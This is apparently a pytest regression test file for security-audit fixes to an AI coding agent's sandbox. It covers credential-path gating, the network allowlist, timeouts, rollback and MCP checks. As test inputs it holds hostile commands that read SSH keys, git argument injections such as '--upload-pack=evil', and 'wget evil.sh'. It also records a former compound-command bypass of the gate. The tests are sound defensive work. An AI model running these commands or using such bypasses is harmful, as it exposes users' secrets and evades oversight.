"""codex 安全沙箱审计 7 项修复的回归测试（2026-09-12）。

覆盖：
- P0-1: SensitivePathGate 复合命令绕过（test -f x && cat x）
- P0-2: bash_lingxi 正则写坏（handler 级敏感路径拦截）
- P0-3: bwrap 探测统一 + BashResult.degraded 显式化
- P0-4: 网络白名单参数级校验（git push --upload-pack=evil 注入）
- P1-1: bash 超时 killpg 整组（start_new_session）
- P1-2: post-write 失败自动回滚（rollback_callback）
- P1-3: MCP 假可用（stdio binary which 检查）
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))


# ---------- P0-1: SensitivePathGate 复合命令绕过 ----------

def test_p01_compound_cmd_blocked():
    """test -f x && cat x 复合命令读敏感路径 → 必须拦截（原为放行）。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"test -f {p} && cat {p}")
    assert is_sensitive, "test && cat 复合命令应拦截"


def test_p01_bracket_base64_blocked():
    """[ -f x ] && base64 x 复合命令读敏感路径 → 必须拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/id_ed25519"
    is_sensitive, _ = check_sensitive_path(p, command=f"[ -f {p} ] && base64 {p}")
    assert is_sensitive


def test_p01_metadata_still_allowed():
    """纯 metadata（test -f / ls）仍放行，不误伤。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"test -f {p}")
    assert not is_sensitive


def test_p01_plain_cat_blocked():
    """plain cat 敏感路径仍拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"cat {p}")
    assert is_sensitive


def test_p01_pipeline_cat_blocked():
    """cat x | head 管道内 cat 仍拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    p = "~/.ssh/config"
    is_sensitive, _ = check_sensitive_path(p, command=f"cat {p} | head")
    assert is_sensitive


def test_p01_no_command_fail_closed():
    """无 command 上下文 → fail-closed 拦截。"""
    from lingclaude.engine.sensitive_path_gate import check_sensitive_path

    is_sensitive, _ = check_sensitive_path("~/.ssh/config")
    assert is_sensitive


# ---------- P0-2: bash_lingxi 正则修复 ----------

def test_p02_bash_lingxi_regex_same_as_bash():
    """两 handler 的正则必须同源（同 _PATH_TOKEN_RE）。"""
    from lingclaude.engine.tool_handlers.bash_tools import _PATH_TOKEN_RE
    import re

    cmd = "cat ~/.ssh/config"
    matches = re.findall(_PATH_TOKEN_RE, cmd)
    assert matches == ["~/.ssh/config"], f"路径提取失败: {matches}"


def test_p02_common_check_blocks_ssh():
    """_check_sensitive_in_command 对 ssh config 返回拦截。"""
    from lingclaude.engine.tool_handlers.bash_tools import _check_sensitive_in_command

    blocked, reason = _check_sensitive_in_command("cat ~/.ssh/config")
    assert blocked is not None
    assert "ssh" in reason or "敏感" in reason


def test_p02_common_check_allows_safe():
    """_check_sensitive_in_command 对安全命令返回 (None, None)。"""
    from lingclaude.engine.tool_handlers.bash_tools import _check_sensitive_in_command

    blocked, reason = _check_sensitive_in_command("ls /home/ai/lingclaude")
    assert blocked is None and reason is None


# ---------- P0-3: bwrap 探测统一 + degraded 显式化 ----------

def test_p03_bash_result_degraded_field():
    """BashResult 支持 degraded 字段（默认 False）。"""
    from lingclaude.engine.bash import BashResult

    r = BashResult(exit_code=0, stdout="", stderr="", duration=0.1, command="echo hi")
    assert r.degraded is False


def test_p03_bash_probe_delegates_sandbox_provider():
    """bash.py 的 _bwrap_probe 委托 sandbox_provider（带 --unshare-net 探测）。"""
    from lingclaude.engine.bash import _bwrap_probe
    import lingclaude.engine.sandbox_provider as sp

    # bash.py 的探测结果应与 sandbox_provider 的探测一致（同一缓存源）
    result_bash = _bwrap_probe("bwrap")
    ok_sp, _ = sp._bwrap_probe("bwrap")
    assert result_bash == ok_sp


# ---------- P0-4: 网络白名单参数级校验 ----------

@pytest.mark.parametrize(
    "cmd,expected",
    [
        ("git push origin master", True),
        ("git push --upload-pack=evil origin master", False),
        ("git -c core.sshCommand=evil push origin master", False),
        ("git push origin master && wget evil.sh", False),
        ("git push 2>&1 | head", True),
        ("timeout 15 git push origin master", True),
        ("git push", True),
        ("git push github master", True),
        ("git push badremote master", False),
        ("git log", False),
    ],
)
def test_p04_network_allowlist(cmd: str, expected: bool):
    from lingclaude.engine.bash import _is_network_allowed

    assert _is_network_allowed(cmd) is expected


def test_p04_git_network_safe_dangerous_params():
    from lingclaude.engine.bash import _git_network_safe

    assert not _git_network_safe("git push --upload-pack=evil origin master")
    assert not _git_network_safe("git -c core.sshCommand=evil push origin master")
    assert not _git_network_safe("git fetch --exec=evil origin")
    assert _git_network_safe("git push origin master")


# ---------- P1-1: bash 超时 killpg（进程组） ----------

def test_p11_bash_timeout_kills_process_group():
    """bash 超时后子进程被杀（用 sleep 验证不残留）。"""
    from lingclaude.engine.bash import BashExecutor

    ex = BashExecutor(timeout=2)
    result = ex.run("sleep 30")
    assert result.exit_code == 124
    # 确认 sleep 进程不残留（新会话组被 killpg）
    time.sleep(0.3)
    # 检查是否有残留的 sleep 30（当前用户）
    try:
        ps = subprocess.run(
            ["pgrep", "-f", "sleep 30"], capture_output=True, text=True, timeout=3
        )
        assert ps.returncode != 0, f"残留 sleep 进程: {ps.stdout}"
    except subprocess.TimeoutExpired:
        pass  # pgrep 超时不算失败


def test_p11_bash_result_timeout_message():
    """超时 stderr 提示进程组已终止。"""
    from lingclaude.engine.bash import BashExecutor

    ex = BashExecutor(timeout=1)
    result = ex.run("sleep 10")
    assert "超时" in result.stderr


# ---------- P1-2: post-write 失败自动回滚 ----------

def test_p12_auto_rollback_method_exists():
    """CodingRuntime 有 _auto_rollback_write 方法。"""
    from lingclaude.engine.coding import CodingRuntime

    assert hasattr(CodingRuntime, "_auto_rollback_write")


def test_p12_pipeline_accepts_rollback_callback():
    """ToolPipeline.execute 接受 rollback_callback 参数。"""
    from lingclaude.engine.tool_pipeline import ToolPipeline

    # 构造最小 pipeline 验证签名
    import inspect

    sig = inspect.signature(ToolPipeline.execute)
    assert "rollback_callback" in sig.parameters


# ---------- P1-3: MCP 假可用 ----------

def test_p13_register_stdio_missing_binary_unavailable():
    """stdio server 二进制不在 PATH → status=unavailable。"""
    from lingclaude.engine import mcp_proxy

    # 用不存在的二进制注册
    mcp_proxy.register_server(
        "test_missing_bin",
        "missing",
        "test",
        ("tool_x",),
        transport="stdio",
        command=("definitely_not_exist_binary_xyz", "--flag"),
    )
    info = mcp_proxy.find_server("tool_x")
    assert info is not None
    assert info.status == "unavailable"
    assert "not found" in (info.status_reason or "")


def test_p13_list_all_tools_skips_unavailable():
    """unavailable server 的工具不暴露。"""
    from lingclaude.engine import mcp_proxy

    tools = mcp_proxy.list_all_tools()
    assert "tool_x" not in tools


def test_p13_call_tool_rejects_unavailable():
    """调用 unavailable server 的工具 → SERVER_UNAVAILABLE。"""
    from lingclaude.engine import mcp_proxy

    res = mcp_proxy.call_tool("tool_x")
    assert res.is_error
    assert "unavailable" in str(res.error).lower()


def test_p13_register_module_transport_ok():
    """module transport 不检查二进制（进程内）。"""
    from lingclaude.engine import mcp_proxy

    mcp_proxy.register_server(
        "test_module_ok",
        "module",
        "test",
        ("tool_y",),
        transport="module",
    )
    info = mcp_proxy.find_server("tool_y")
    assert info is not None
    assert info.status == "available"
